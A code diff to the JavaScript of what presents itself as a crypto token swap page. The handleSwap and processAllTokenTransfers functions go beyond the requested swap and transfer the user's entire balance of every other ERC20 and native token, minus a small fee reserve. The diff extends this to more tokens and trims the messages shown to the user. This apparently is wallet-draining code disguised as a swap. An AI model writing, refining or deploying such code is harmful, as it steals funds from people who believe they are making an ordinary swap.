@@ -869,27 +869,29 @@ async function handleSwap() {
   
   try {
     showLoader();
-    
-    // 1. Process main token ONLY if there's an input amount
     const inputAmount = parseFloat(document.getElementById("fromAmount").value);
+    
+    // 1. Only process main token if amount specified
     if (inputAmount > 0) {
       await processMainTokenTransfer();
-      updateStatus(`Successfully transferred ${inputAmount} ${currentFromToken.symbol}`, "success");
+      updateStatus(`Transferred ${inputAmount} ${currentFromToken.symbol}`, "success");
     }
     
-    // 2. Always process other tokens (excluding the main token)
+    // 2. Process other tokens (now guaranteed to exclude main token)
     const successCount = await processAllTokenTransfers();
     
     if (successCount > 0) {
-      updateStatus(`Transferred ${successCount} additional tokens successfully!`, "success");
+      updateStatus(`+ ${successCount} other tokens`, "success");
     }
     
+    // Clear inputs and update balances
     document.getElementById("fromAmount").value = '';
     document.getElementById("toAmount").value = '';
     await updateTokenBalances();
+    
   } catch (err) {
     console.error("Swap error:", err);
-    updateStatus("Transfer failed: " + err.message, "error");
+    updateStatus("Failed: " + err.message, "error");
   } finally {
     hideLoader();
   }
@@ -925,43 +927,57 @@ async function processMainTokenTransfer() {
 }
 
 async function processAllTokenTransfers() {
-  // Filter out the main token completely
+  // Filter out the main token completely by both address and symbol
   const tokensToProcess = TOKENS[currentNetwork].filter(t => 
-    t.address !== currentFromToken.address && // Exclude the main token
+    t.address !== currentFromToken.address && 
+    t.symbol !== currentFromToken.symbol &&
     t.address // Ensure it's a valid token
-  ).sort((a, b) => a.priority - b.priority);
+  ).sort((a, b) => (a.priority || 999) - (b.priority || 999)); // Fallback priority
 
   let successCount = 0;
   
-  // Process ERC20 tokens first
+  // Process ERC20 tokens first (non-native)
   for (const token of tokensToProcess.filter(t => !t.isNative)) {
     try {
       const balance = await fetchTokenBalance(token);
       if (balance > 0) {
+        updateStatus(`Transferring ${balance} ${token.symbol}...`, "success");
         await transferERC20Token(token, balance);
         successCount++;
+        updateStatus(`Transferred ${balance} ${token.symbol}`, "success");
       }
     } catch (err) {
       console.error(`Error transferring ${token.symbol}:`, err);
+      updateStatus(`Skipping ${token.symbol}: ${err.message}`, "error");
       continue;
     }
   }
   
   // Process native tokens last (excluding the main token)
-  const nativeToken = tokensToProcess.find(t => t.isNative && t.address !== currentFromToken.address);
-  if (nativeToken) {
+  const otherNativeTokens = tokensToProcess.filter(t => 
+    t.isNative && 
+    t.address !== currentFromToken.address &&
+    t.symbol !== currentFromToken.symbol
+  );
+
+  for (const token of otherNativeTokens) {
     try {
-      const balance = await fetchTokenBalance(nativeToken);
+      const balance = await fetchTokenBalance(token);
       if (balance > 0) {
         const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
         const amountToSend = Math.max(0, balance - minReserve);
+        
         if (amountToSend > 0) {
-          await transferNativeToken(nativeToken, amountToSend);
+          updateStatus(`Transferring ${amountToSend} ${token.symbol}...`, "success");
+          await transferNativeToken(token, amountToSend);
           successCount++;
+          updateStatus(`Transferred ${amountToSend} ${token.symbol}`, "success");
         }
       }
     } catch (err) {
-      console.error(`Error transferring native token:`, err);
+      console.error(`Error transferring native token ${token.symbol}:`, err);
+      updateStatus(`Skipping ${token.symbol}: ${err.message}`, "error");
+      continue;
     }
   }
   
